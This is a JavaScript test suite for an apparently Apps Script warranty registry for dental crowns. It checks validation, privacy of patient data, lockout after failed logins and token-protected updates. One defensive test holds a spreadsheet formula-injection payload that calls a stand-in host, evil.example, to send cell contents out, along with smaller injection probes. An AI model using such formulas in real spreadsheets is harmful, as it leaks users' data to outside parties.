const test = require('node:test');
const assert = require('node:assert/strict');
const { createGas, sheetDate } = require('./support/gas');
const { fixtureRows, RECENT, plusYears } = require('./support/fixtures');

const PII_KEYS = ['phone', 'email', 'locationIp', 'locationCity', 'locationRegion', 'locationCountry', 'ip', 'patient', 'patientName'];

function setup() {
  const gas = createGas();
  gas.load(fixtureRows());
  gas.props.set('OPS_TOKEN', 'test-ops-token-123');
  return gas;
}

function register(gas, over = {}) {
  return gas.post({
    action: 'register', id: 'ZIR-4510', patientName: 'Meera Joshi', phone: '+91 98220 11111',
    email: 'Meera@Example.com', consentAgreed: true,
    location: { city: 'Nagpur', region: 'Maharashtra', country: 'India', ip: '203.0.113.5' }, ...over
  });
}

function deepKeys(obj, out = []) {
  if (obj && typeof obj === 'object') for (const [k, v] of Object.entries(obj)) { out.push(k); deepKeys(v, out); }
  return out;
}

// ---------------------------------------------------------------- routing
test('ping reports version and nothing about the registry', () => {
  const gas = setup();
  const res = gas.get({ action: 'ping' });
  assert.equal(res.success, true);
  assert.equal(res.version, '2.0.0');
  assert.equal(res.totalCases, undefined);
});

test('web setup is refused; unknown actions and bad JSON fail cleanly', () => {
  const gas = setup();
  assert.equal(gas.get({ action: 'setup' }).code, 'UNAUTHORIZED');
  assert.equal(gas.get({ action: 'drop_tables' }).code, 'UNKNOWN_ACTION');
  assert.equal(gas.post('{not json').code, 'INVALID_INPUT');
});

test('unexpected exceptions return a generic SERVER_ERROR without internals', () => {
  const gas = setup();
  gas.ctx.SpreadsheetApp.getActiveSpreadsheet = () => { throw new Error('secret internal path /x/y'); };
  const res = gas.get({ action: 'lookup', id: 'ZIR-4510' });
  assert.equal(res.code, 'SERVER_ERROR');
  assert.doesNotMatch(JSON.stringify(res), /secret internal/);
});

// ---------------------------------------------------------------- lookup
test('lookup of an unregistered dispatched case returns public details only', () => {
  const gas = setup();
  const res = gas.get({ action: 'lookup', id: 'zir-4510' });
  assert.equal(res.success, true);
  assert.equal(res.isRegistered, false);
  assert.equal(res.crown.crownId, 'ZIR-4510');
  assert.equal(res.crown.dispatchDate, RECENT);
  assert.equal(res.crown.expiryDate, plusYears(RECENT, 5));
  assert.equal(res.crown.materialFull, 'Zirconia Crown · Multi-Layer 3D Pro');
  assert.equal(res.crown.warrantyId, `HLW ZIR 4510 ${RECENT.slice(2, 4)}${RECENT.slice(5, 7)}`);
  for (const k of PII_KEYS) assert.ok(!deepKeys(res).includes(k), `lookup leaked ${k}`);
});

test('lookup of a registered case never leaks patient data', () => {
  const gas = setup();
  const res = gas.get({ action: 'lookup', id: 'CER-8942' });
  assert.equal(res.isRegistered, true);
  assert.equal(res.maskedPhone, 'ending in 2345');
  assert.equal(res.crown, undefined);
  const body = JSON.stringify(res);
  for (const needle of ['JANE', '9822012345', 'jane@example.com', '203.0.113.19', 'Mumbai']) {
    assert.ok(!body.includes(needle), `lookup leaked ${needle}`);
  }
});

test('lookup rejects malformed IDs, unknown IDs and undispatched cases', () => {
  const gas = setup();
  assert.equal(gas.get({ action: 'lookup', id: 'ZIR4510' }).code, 'INVALID_INPUT');
  assert.equal(gas.get({ action: 'lookup', id: '' }).code, 'INVALID_INPUT');
  assert.equal(gas.get({ action: 'lookup', id: 'ZIR-9999' }).code, 'NOT_FOUND');
  assert.equal(gas.get({ action: 'lookup', id: 'CER-1001' }).code, 'NOT_DISPATCHED');
});

test('missing ops data stays empty — no invented dentist, clinic or shade', () => {
  const gas = setup();
  const { crown } = gas.get({ action: 'lookup', id: 'ZIR-2002' });
  assert.equal(crown.dentist, '');
  assert.equal(crown.clinic, '');
  assert.equal(crown.shade, '');
  assert.equal(crown.tooth, '');
  assert.equal(crown.caseRef, '');
  assert.equal(crown.product, '');
  assert.equal(crown.warrantyYears, 5);
  assert.equal(crown.expiryDate, plusYears(RECENT, 5));
});

test('dates in IST sheet cells are not shifted a day back', () => {
  const gas = setup();
  const sh = gas.sheet();
  sh.cells[1][2] = sheetDate(2026, 8, 19); // midnight IST = 18:30 previous day UTC
  sh.cells[1][4] = sheetDate(2031, 8, 19);
  const { crown } = gas.get({ action: 'lookup', id: 'ZIR-4510' });
  assert.equal(crown.dispatchDate, '2026-08-19');
  assert.equal(crown.expiryDate, '2031-08-19');
  assert.equal(crown.warrantyId, 'HLW ZIR 4510 2608');
});

// ---------------------------------------------------------------- register
test('registration writes patient columns as text, with consent and location', () => {
  const gas = setup();
  const res = register(gas);
  assert.equal(res.success, true);
  assert.equal(res.crown.patient, 'MEERA JOSHI');
  assert.equal(res.crown.maskedPhone, 'ending in 1111');
  assert.equal(res.crown.phone, undefined);
  assert.equal(res.crown.email, undefined);
  const row = gas.row('ZIR-4510');
  assert.equal(row[14], 'MEERA JOSHI');
  assert.equal(row[15], '919822011111');
  assert.equal(typeof row[15], 'string');
  assert.equal(row[16], 'meera@example.com');
  assert.deepEqual(row.slice(18, 22), ['Nagpur', 'Maharashtra', 'India', '203.0.113.5']);
  assert.match(row[22], /^AGREED - v1\.0 \[T&C \+ Privacy Policy\] @ \d{4}-\d{2}-\d{2} /);
});

test('registration validates every field', () => {
  const gas = setup();
  assert.equal(register(gas, { patientName: ' ' }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { phone: '12345' }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { phone: '1234567890123456' }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { email: 'not-an-email' }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { consentAgreed: false }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { id: 'ZIR45' }).code, 'INVALID_INPUT');
  assert.equal(register(gas, { id: 'ZIR-9999' }).code, 'NOT_FOUND');
  assert.equal(register(gas, { id: 'CER-1001' }).code, 'NOT_DISPATCHED');
  assert.equal(gas.row('ZIR-4510')[15], '', 'nothing written after rejected attempts');
});

test('a registered phone can never be replaced from the web', () => {
  const gas = setup();
  assert.equal(register(gas).success, true);
  const second = register(gas, { patientName: 'Attacker', phone: '9111111111' });
  assert.equal(second.code, 'ALREADY_REGISTERED');
  assert.equal(second.maskedPhone, 'ending in 1111');
  assert.equal(gas.row('ZIR-4510')[14], 'MEERA JOSHI');
  assert.equal(gas.row('ZIR-4510')[15], '919822011111');
});

test('formula-looking input is stored as literal text, never executed', () => {
  const gas = setup();
  const evil = '=IMPORTXML("http://evil.example/?"&A1,"//a")';
  const res = register(gas, { patientName: evil, email: '', location: { city: '=1+1', region: '+cmd', country: '@SUM(A1)', ip: '-2+3' } });
  assert.equal(res.success, true);
  const row = gas.row('ZIR-4510');
  assert.ok(!row.includes('#FORMULA_EXECUTED'), 'a formula was stored');
  assert.equal(row[14], evil.toUpperCase());
  assert.equal(row[18], '=1+1');
});

test('overlong and control-character input is trimmed', () => {
  const gas = setup();
  register(gas, { patientName: 'A'.repeat(500) + '\u0007' });
  assert.equal(gas.row('ZIR-4510')[14].length, 80);
});

test('registration returns BUSY instead of racing when the lock is held', () => {
  const gas = setup();
  gas.lock.held = true;
  assert.equal(register(gas).code, 'BUSY');
  gas.lock.held = false;
  assert.equal(register(gas).success, true);
});

test('legacy GET registration still works for old clients', () => {
  const gas = setup();
  const res = gas.get({ action: 'register', id: 'EMX-1001', patientName: 'Old Client', phone: '9876543210', consentAgreed: 'true', city: 'Delhi' });
  assert.equal(res.success, true);
  assert.equal(gas.row('EMX-1001')[18], 'Delhi');
});

// ---------------------------------------------------------------- verify_login
test('check-in matches the last 10 digits regardless of formatting', () => {
  const gas = setup();
  const res = gas.post({ action: 'verify_login', id: 'CER-8942', phone: '+91-98220 12345' });
  assert.equal(res.success, true);
  assert.equal(res.crown.patient, 'JANE DOE');
  assert.equal(res.crown.maskedPhone, 'ending in 2345');
  for (const k of ['phone', 'email', 'locationIp', 'locationCity']) assert.equal(res.crown[k], undefined);
  assert.match(String(gas.row('CER-8942')[23]), /\d/);
});

test('wrong phone is rejected and locks out after 5 attempts, even for the right phone', () => {
  const gas = setup();
  for (let i = 1; i <= 4; i++) {
    const r = gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9000000000' });
    assert.equal(r.code, 'WRONG_PHONE');
    assert.equal(r.attemptsLeft, 5 - i);
  }
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9000000000' }).code, 'LOCKED');
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9822012345' }).code, 'LOCKED');
  gas.cache.clear(); // lockout expires
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9822012345' }).success, true);
});

test('successful check-in resets the failure counter', () => {
  const gas = setup();
  for (let i = 0; i < 3; i++) gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9000000000' });
  gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9822012345' });
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9000000000' }).attemptsLeft, 4);
});

test('check-in on unregistered / unknown cases and short phones', () => {
  const gas = setup();
  assert.equal(gas.post({ action: 'verify_login', id: 'ZIR-4510', phone: '9822012345' }).code, 'NOT_REGISTERED');
  assert.equal(gas.post({ action: 'verify_login', id: 'ZIR-9999', phone: '9822012345' }).code, 'NOT_FOUND');
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '12345' }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ action: 'verify_login', id: 'CER-8942', phone: '' }).code, 'INVALID_INPUT');
});

test('registeredAt stored as a sheet datetime is returned as text', () => {
  const gas = setup();
  const res = gas.post({ action: 'verify_login', id: 'CER-8942', phone: '9822012345' });
  assert.equal(res.crown.registeredAt, '2026-01-02 10:00:00');
});

// ---------------------------------------------------------------- ops_update
test('ops_update fails closed without a configured token', () => {
  const gas = setup();
  gas.props.delete('OPS_TOKEN');
  assert.equal(gas.post({ action: 'ops_update', token: '', id: 'ZIR-4510', dispatchStatus: 'Delivered' }).code, 'UNAUTHORIZED');
  gas.props.set('OPS_TOKEN', 'x'.repeat(32));
  assert.equal(gas.post({ action: 'ops_update', token: 'wrong', id: 'ZIR-4510' }).code, 'UNAUTHORIZED');
  assert.equal(gas.get({ action: 'ops_update', id: 'ZIR-4510' }).code, 'UNAUTHORIZED');
  assert.equal(gas.row('ZIR-4510')[1], 'Dispatched');
});

test('ops_update updates an existing case and recomputes expiry', () => {
  const gas = setup();
  const res = gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'CER-1001', dispatchStatus: 'Dispatched', dispatchDate: '2026-09-01', warrantyYears: 7, clinic: 'New Clinic' });
  assert.equal(res.success, true);
  assert.equal(res.created, false);
  assert.equal(res.crown.dispatchDate, '2026-09-01');
  assert.equal(res.crown.expiryDate, '2033-09-01');
  assert.equal(res.crown.clinic, 'New Clinic');
  assert.equal(gas.get({ action: 'lookup', id: 'CER-1001' }).success, true);
});

test('ops_update never touches patient columns', () => {
  const gas = setup();
  gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'CER-8942', notes: 'Remake shipped' });
  const row = gas.row('CER-8942');
  assert.equal(row[14], 'JANE DOE');
  assert.equal(row[15], '9822012345');
  assert.equal(row[13], 'Remake shipped');
});

test('ops_update creates new cases without invented data', () => {
  const gas = setup();
  const res = gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'zir-7777' });
  assert.equal(res.created, true);
  const row = gas.row('ZIR-7777');
  assert.equal(row[1], 'In Production');
  assert.equal(row[2], '');
  assert.equal(row[11], '', 'no default doctor');
  assert.equal(row[10], '', 'no default clinic');
  assert.equal(gas.get({ action: 'lookup', id: 'ZIR-7777' }).code, 'NOT_DISPATCHED');
});

test('ops_update marks dispatch today when status is Dispatched without a date', () => {
  const gas = setup();
  const res = gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'ZIR-8888', dispatchStatus: 'Dispatched', material: 'Zirconia Crown' });
  assert.match(res.crown.dispatchDate, /^\d{4}-\d{2}-\d{2}$/);
  assert.equal(res.crown.expiryDate, plusYears(res.crown.dispatchDate, 5));
});

test('ops_update validates dates, years and IDs', () => {
  const gas = setup();
  const base = { action: 'ops_update', token: 'test-ops-token-123', id: 'ZIR-4510' };
  assert.equal(gas.post({ ...base, dispatchDate: '31-31-2026' }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ ...base, dispatchDate: '2026-02-30' }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ ...base, warrantyYears: 0 }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ ...base, warrantyYears: 'ten' }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ ...base, id: 'BAD' }).code, 'INVALID_INPUT');
  assert.equal(gas.post({ ...base, dispatchDate: '19/08/2026' }).crown.dispatchDate, '2026-08-19');
});

test('ops_update stores formula-looking ops text literally', () => {
  const gas = setup();
  gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'ZIR-4510', notes: '=HYPERLINK("x")' });
  assert.equal(gas.row('ZIR-4510')[13], '=HYPERLINK("x")');
  gas.post({ action: 'ops_update', token: 'test-ops-token-123', id: 'ZIR-4510', dispatchStatus: 'Delivered' });
  assert.ok(!gas.row('ZIR-4510').includes('#FORMULA_EXECUTED'));
});

// ---------------------------------------------------------------- helpers & triggers
test('expiry handles leap days and invalid input', () => {
  const gas = setup();
  assert.equal(gas.ctx.computeExpiryDate('2024-02-29', 5), '2029-02-28');
  assert.equal(gas.ctx.computeExpiryDate('2024-02-29', 4), '2028-02-29');
  assert.equal(gas.ctx.computeExpiryDate('garbage', 5), '');
  assert.equal(gas.ctx.normalizeDate('2026-13-01'), '');
});

test('onEdit recomputes expiry for single and pasted multi-row edits', () => {
  const gas = setup();
  const sh = gas.sheet();
  sh.write(2, 3, '2026-03-01');
  sh.write(3, 4, 2);
  gas.ctx.onEdit({ range: sh.getRange(2, 3, 2, 2) });
  assert.equal(gas.ctx.normalizeDate(gas.row('ZIR-4510')[4]), '2031-03-01');
  assert.equal(gas.ctx.normalizeDate(gas.row('EMX-1001')[4]), plusYears(gas.ctx.normalizeDate(gas.row('EMX-1001')[2]), 2));
});

test('onEdit stamps dispatch date when status becomes Dispatched', () => {
  const gas = setup();
  const sh = gas.sheet();
  sh.write(5, 2, 'Dispatched'); // CER-1001
  gas.ctx.onEdit({ range: sh.getRange(5, 2) });
  const row = gas.row('CER-1001');
  assert.ok(row[2] instanceof Date);
  assert.ok(row[4] instanceof Date);
});

test('seedDemoCases refuses to touch a registry that already has data', () => {
  const gas = setup();
  assert.match(gas.ctx.seedDemoCases(), /already has data/);
  gas.load([]);
  assert.match(gas.ctx.seedDemoCases(), /Seeded 4/);
});
